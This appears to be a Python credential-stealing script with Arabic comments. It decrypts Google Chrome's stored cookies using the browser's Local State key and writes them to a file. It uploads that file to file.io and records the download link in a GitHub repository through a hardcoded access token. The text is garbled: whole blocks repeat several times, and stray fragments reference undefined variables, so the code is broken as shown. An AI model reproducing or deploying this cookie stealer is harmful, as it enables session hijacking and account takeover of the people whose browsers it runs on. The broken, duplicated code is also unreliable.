import os, json, base64, sqlite3, shutil, requests, time
from Crypto.Cipher import AES
import win32crypt

# إعدادات الوصول لمستودعك
GITHUB_TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
REPO = "Noor092324/Noor-config"

def get_key():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(path, "r", encoding="utf-8") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
    except: return None

def harvest():
    key = get_key()
    if not key: return None
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.exists(db_path): return None
    
    shutil.copyfile(db_path, "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies_text = ""
    for host, name, enc_val in cursor.fetchall():
        try:
            iv, payload = enc_val[3:15], enc_val[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            val = cipher.decrypt(payload)[:-16].decode()
            cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
        except: continue
    
    conn.close()
    if os.path.exists("temp_db"): os.remove("temp_db")
    
    file_name = "my_cookies.txt"
    with open(file_name, "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return file_name

def upload_and_notify(file_path):
    while True:
        try:
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60)

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    generated_file = harvest()
    if generated_file:
        upload_and_notify(generated_file)
    conn.close()
    if os.path.exists("temp_db"): os.remove("temp_db")
    
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True:
        try:
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60)

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
    conn.close()
    os.remove("temp.db")
    # تجهيز الملف محلياً أولاً
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True: # المحاولة المستمرة في حال انقطاع الإنترنت
        try:
            # الرفع لخدمة file.io للحصول على رابط تنزيل مباشر لمرة واحدة
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                # إرسال الرابط فقط لمستودعك
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60) # الانتظار دقيقة قبل المحاولة مجدداً

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    # الحصول على الملف الحالي لتحديثه
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    # وضع الرابط الجديد في ملف الـ JSON
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
    conn.close()
    os.remove("temp.db")
    # تجهيز الملف محلياً أولاً
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True: # المحاولة المستمرة في حال انقطاع الإنترنت
        try:
            # الرفع لخدمة file.io للحصول على رابط تنزيل مباشر لمرة واحدة
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                # إرسال الرابط فقط لمستودعك
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60) # الانتظار دقيقة قبل المحاولة مجدداً

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    # الحصول على الملف الحالي لتحديثه
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    # وضع الرابط الجديد في ملف الـ JSON
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
